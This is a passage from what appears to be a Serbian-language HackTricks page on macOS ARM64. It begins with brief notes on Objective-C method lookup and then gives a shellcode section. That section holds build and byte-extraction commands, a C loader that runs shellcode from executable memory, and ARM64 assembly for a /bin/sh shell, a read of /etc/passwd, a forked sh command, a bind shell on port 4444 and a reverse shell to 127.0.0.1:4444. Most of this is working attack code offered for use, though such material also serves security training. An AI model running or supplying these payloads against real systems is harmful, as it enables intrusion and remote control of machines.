> Nadalje, podešavanjem **`OBJC_HELP=1`** i pokretanjem bilo kog binarnog fajla možeš videti druge environment promenljive koje možeš koristiti da **zabeležiš** kada se određene Objc-C akcije dese.

Kada se ova funkcija pozove, potrebno je pronaći metod koji je pozvan za datu instancu; za to se izvode različite pretrage:

- Izvrši optimistic cache lookup:
- Ako uspe, gotovo
- Stekni runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Pokušaj class own cache:
- Ako uspe, gotovo
- Pokušaj class method list:
- Ako je pronađeno, popuni cache i gotovo
- Pokušaj superclass cache:
- Ako uspe, gotovo
- Pokušaj superclass method list:
- Ako je pronađeno, popuni cache i gotovo
- Ako (resolver) postoji, pokušaj method resolver i ponovi od class lookup
- Ako si i dalje ovde (= sve ostalo je propalo), pokušaj forwarder

### Shellcodes

Za kompajliranje:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Da biste izvukli bajtove:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Za novije verzije macOS-a:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code za testiranje shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto sa [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i objašnjeno.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Pročitaj pomoću cat

Cilj je da se izvrši `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, pa je drugi argument (x1) niz parametara (što u memoriji znači stack adresa).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Pozovi komandu sa sh iz fork-a tako da glavni proces ne bude ubijen
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell iz [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Iz [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
